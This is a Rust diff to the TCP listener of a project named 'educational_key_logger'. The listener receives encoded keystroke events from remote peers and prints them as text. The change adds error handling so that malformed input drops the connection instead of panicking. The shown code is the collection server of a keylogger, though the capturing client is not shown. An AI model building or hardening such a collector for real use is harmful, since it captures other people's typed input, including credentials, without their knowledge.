@@ -1,13 +1,13 @@
 mod parser;
 use educational_key_logger::IP_PORT;
 use educational_key_logger::input::InputEvent;
-use log::{error, info};
+use log::{error, info, warn};
 use parser::input_events_to_text;
 use std::io::{self, Read, Stdout};
 use std::net::{TcpListener, TcpStream};
 use std::sync::{Arc, Mutex};
-use std::thread;
 use std::time::Duration;
+use std::{fmt, thread};
 
 const TIMEOUT_DURATION: Duration = Duration::from_secs(2);
 
@@ -73,7 +73,12 @@ fn handle_stream(mut stream: TcpStream, stdout: Arc<Mutex<Stdout>>, peer_addr: S
                 break;
             }
             Ok(bytes_read) => {
-                stream_read_handler.read_buffer(&buffer[..bytes_read]);
+                if let Err(err) = stream_read_handler.read_buffer(&buffer[..bytes_read]) {
+                    warn!("Failed to read buffer: {}", err);
+                    warn!("Shutting down the connection");
+                    drop(stream);
+                    return;
+                }
             }
             Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                 // TIMEOUT
@@ -111,7 +116,7 @@ impl StreamReadHandler {
             peer_addr,
         }
     }
-    pub fn read_buffer(&mut self, buffer: &[u8]) {
+    pub fn read_buffer(&mut self, buffer: &[u8]) -> Result<(), InvalidEncodedInputEventError> {
         let mut buffer_index = 0;
         while buffer_index < buffer.len() {
             match self.size_prefix {
@@ -137,7 +142,7 @@ impl StreamReadHandler {
                             &buffer[buffer_index..(buffer_index + available_space)],
                         );
                         buffer_index += available_space;
-                        self.input_event_buffer_full();
+                        self.input_event_buffer_full()?;
                     } else {
                         self.input_event_buffer
                             .extend_from_slice(&buffer[buffer_index..]);
@@ -145,14 +150,17 @@ impl StreamReadHandler {
                 }
             };
         }
+        Ok(())
     }
-    fn input_event_buffer_full(&mut self) {
-        self.input_events.push(
-            postcard::from_bytes(&self.input_event_buffer)
-                .expect("Handler ensures complete and correctly framed InputEvent"),
-        );
+    fn input_event_buffer_full(&mut self) -> Result<(), InvalidEncodedInputEventError> {
+        self.input_events
+            .push(match postcard::from_bytes(&self.input_event_buffer) {
+                Ok(input_event) => input_event,
+                Err(_) => return Err(InvalidEncodedInputEventError),
+            });
         self.input_event_buffer.clear();
         self.size_prefix = None;
+        Ok(())
     }
 
     fn handle_input_events(&mut self) {
@@ -166,5 +174,14 @@ impl StreamReadHandler {
             self.peer_addr,
             input_events_to_text(&input_events)
         )
+    }
+}
+
+#[derive(Debug, Clone)]
+struct InvalidEncodedInputEventError;
+
+impl fmt::Display for InvalidEncodedInputEventError {
+    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
+        write!(f, "Encoded bytes of InputEvent was invalid.")
     }
 }
